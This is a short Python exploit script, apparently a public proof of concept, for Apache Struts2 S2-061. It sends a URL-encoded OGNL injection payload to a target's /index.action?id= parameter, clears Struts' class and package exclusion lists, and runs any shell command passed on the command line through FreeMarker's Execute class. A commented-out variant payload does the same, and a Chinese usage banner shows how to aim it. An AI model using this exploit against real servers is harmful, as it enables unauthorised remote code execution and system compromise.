#!/usr/bin/python3
# author callyer

import requests
import sys
import re
from lxml import etree


def s2_check():
    # payload="%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27"+sys.argv[2]+"%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d"
    payload="%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22"+sys.argv[2]+"%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D"
    url=sys.argv[1]+"/index.action?id="+payload
    response=requests.get(url).text
    res=etree.HTML(response)
    result=res.xpath("/html/body/a/@id")
    print(result)
    # z=re.findall("a id=[\s\S]*\n\"",r)
    # print(z)
    # print (str(z).replace("a id=\"",""))

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("[+]============================================================")
        print("[+]请按照以下格式使用")
        print("[+]example useage: pyhton s2-061.py http://ip:port command")
        print("[+]============================================================")
        sys.exit()
    s2_check()
